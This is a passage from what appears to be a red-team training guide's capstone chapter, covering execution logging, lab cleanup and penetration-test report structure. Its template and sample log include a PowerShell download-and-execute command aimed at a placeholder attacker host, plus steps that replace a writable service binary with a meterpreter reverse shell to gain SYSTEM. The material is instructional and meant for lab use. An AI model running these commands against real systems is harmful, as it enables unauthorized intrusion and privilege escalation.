**Timestamp:** When did you perform the action?\r\n2.  **Host:** Which system are you currently operating on?\r\n3.  **User Context:** What user are you running as? (e.g., `low-priv-user`, `NT AUTHORITY\\SYSTEM`).\r\n4.  **Action/Command:** What did you do? (e.g., \"Attempting PE using Service X vulnerability\", `powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/PowerUp.ps1'); Invoke-AllChecks\"`)\r\n5.  **Result:** What happened? Was it successful? Did it fail? What was the output? (Include command output or screenshots).\r\n6.  **Analysis/Notes:** What does this result tell you? What's the next step based on this? Did you deviate from the plan and why?\r\n\r\n**Example Log Snippet:**\r\n\r\n```markdown\r\n---\r\n### Capstone Execution Log - Objective: Obtain DA\r\n\r\n**Starting Point:** Low-priv user `user.low` on `WKSTN1`.\r\n\r\n**[2023-10-27 10:05:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Initial recon - check basic system info.\r\n**Command:** `systeminfo`\r\n**Result:** Output shows Windows 10 Pro, build xxxx. Domain joined to CONTOSO.COM. Patch level seems relatively recent.\r\n**Notes:** System is Windows 10. Need to identify specific build/missing patches later if kernel exploit is considered.\r\n\r\n**[2023-10-27 10:07:30]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Check running processes for interesting targets or potential PE vectors.\r\n**Command:** `tasklist /svc`\r\n**Result:** Output lists services and their PIDs. See 'VulnerableService.exe' running with PID 1234. Looks suspicious.\r\n**Notes:** Investigate 'VulnerableService.exe'. Check its path and permissions.\r\n\r\n**[2023-10-27 10:15:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Check permissions on 'VulnerableService.exe' path.\r\n**Command:** `icacls \"C:\\Program Files\\Vulnerable Service\"`\r\n**Result:** Output shows 'BUILTIN\\Users:(F)'. Full control for standard users! This is a PE vector.\r\n**Notes:** Plan changed: Pursue vulnerable service PE. Will attempt to replace the service binary.\r\n\r\n**[2023-10-27 10:20:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Attempting to replace VulnerableService.exe with malicious binary (meterpreter shell reverse tcp, rename to VulnerableService.exe).\r\n**Command:** `copy C:\\Users\\user.low\\Desktop\\evil.exe \"C:\\Program Files\\Vulnerable Service\\VulnerableService.exe\"`\r\n**Result:** Copy successful!\r\n**Notes:** Now need to restart the service.\r\n\r\n**[2023-10-27 10:21:00]**\r\n**Host:** WKSTN1\r\n**User:** CONTOSO\\user.low\r\n**Action:** Restarting VulnerableService.\r\n**Command:** `sc stop VulnerableService` then `sc start VulnerableService`\r\n**Result:** Service stopped and started successfully. Attacker listener received connection! Got SYSTEM shell.\r\n**Notes:** PE successful via vulnerable service binary replacement. Now at `NT AUTHORITY\\SYSTEM` on WKSTN1. Proceed to M2/M6 techniques for cred harvesting as SYSTEM.\r\n---\r\n```\r\n\r\nThis level of detail is crucial. It allows you to reconstruct your steps for the report and understand where things went right or wrong.\r\n\r\n### Section 8.4: Post-Operation (Capstone Phase 3)\r\n\r\nIn a real red team engagement, this phase involves:\r\n\r\n*   **Cleanup:** Removing persistence mechanisms, deleting tools/scripts dropped on disk, clearing logs (carefully, and often leaving traces anyway), removing any created accounts or objects.\r\n*   **Verification:** Double-checking that the objective was definitively met.\r\n*   **Knowledge Transfer:** Briefing the client defenders (often done as part of the report).\r\n\r\nIn your lab Capstone:\r\n\r\n*   **Cleanup:** The easiest way is often to revert your lab VMs to a clean state before the operation. If you created persistence, *manually* go back and remove it as a practice exercise.\r\n*   **Verification:** Ensure you have undeniable proof that you achieved your objective (e.g., screenshot of a Domain Admin shell, screenshot accessing the sensitive file share from your compromised path).\r\n\r\n### Section 8.5: Documentation & Reporting (Capstone Phase 4)\r\n\r\nThis is where you synthesize your execution log and findings into a coherent report. A good report is arguably as important as the successful execution itself. It's how you communicate value and help the defenders improve.\r\n\r\n#### 8.5.1 Why Good Reporting Matters\r\n\r\n*   **Communication:** Translates technical actions into understandable impact.\r\n*   **Actionable Intelligence:** Provides defenders with concrete findings and recommendations to fix vulnerabilities.\r\n*   **Demonstrates Value:** Shows the client/management what was achieved and the security posture from an attacker's perspective.\r\n*   **Knowledge Transfer:** Educates the defense team on attacker TTPs.\r\n\r\n#### 8.5.2 Target Audiences\r\n\r\n*   **Executive Summary:** High-level overview for management. Focus on the objective, whether it was achieved, the overall risk demonstrated, and key recommendations. *Non-technical language.*\r\n*   **Technical Details:** For the security team and system administrators. Detailed steps, specific vulnerabilities, affected systems, tools used, evidence. *Technical language.*\r\n\r\n#### 8.5.3 Report Structure\r\n\r\nA standard structure is often used:\r\n\r\n1.  **Executive Summary:** (1-2 pages)\r\n    *   Objective of the engagement.\r\n    *   Summary of findings and overall risk.\r\n    *   Confirmation of whether the objective was met.\r\n    *   Key recommendations.\r\n2.  **Scope and Objectives:**\r\n    *   Clearly state what was in scope (systems, network ranges).\r\n    *   Reiterate the specific objectives.\r\n    *   Mention any RoE or constraints.\r\n3.  **Methodology:**\r\n    *   Briefly describe the approach taken (e.g., simulated initial access, focus on AD environment).\r\n    *   Mention the phases of the operation (recon, PE, LM, etc.).\r\n4.  **Findings:**\r\n    *   This is the core technical section. Organize logically.\r\n    *   Common organization methods:\r\n        *   By kill chain phase (Recon Findings, PE Findings, LM Findings, etc.)\r\n        *   By severity (Critical, High, Medium, Low)\r\n        *   By system/group of systems\r\n    *   For *each* finding (e.g., \"Weak Service Permissions on WKSTN1\", \"Kerberoastable User Account\", \"Unconstrained Delegation on APP01\"):\r\n        *   **Title:** Clear and concise.\r\n        *   **Description:** Explain the vulnerability/misconfiguration.\r\n        *   **Location:** Where was it found (Host, User, AD Object)?\r\n        *   **Impact:** How could an attacker leverage this? (e.g., \"Allows local privilege escalation\", \"Grants access to crackable hash\", \"Allows impersonation of any service\").\r\n        *   **Proof of Concept/Steps to Reproduce:** This is where your execution log comes in! Detail the steps taken to identify and exploit it. Include commands, relevant output, and screenshots as evidence. *Example:* \"Step 1: Ran `icacls \"C:\\Program Files\\Vulnerable"
